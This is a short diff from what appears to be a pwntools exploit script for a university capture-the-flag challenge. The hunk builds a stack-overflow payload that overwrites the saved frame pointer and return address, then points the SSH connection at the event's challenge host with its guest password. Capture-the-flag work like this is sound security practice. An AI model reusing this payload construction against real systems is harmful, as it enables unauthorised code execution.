@@ -14,7 +14,7 @@ payload += b"B" * 8   # Overwrite saved RBP
 payload += p64(get_details);
 
 # Connect via SSH and initiate interactive "shell"
-p = ssh("guest", "localhost", password="ctf2025!", port=30202, timeout=5, raw=True)
+p = ssh("guest", "poison-in-the-wells-2.ctf.umanitobacssa.ca", password="ctf2025!", port=30202, timeout=5, raw=True)
 io = p.shell()
 
 # Wait until the server is ready for a command
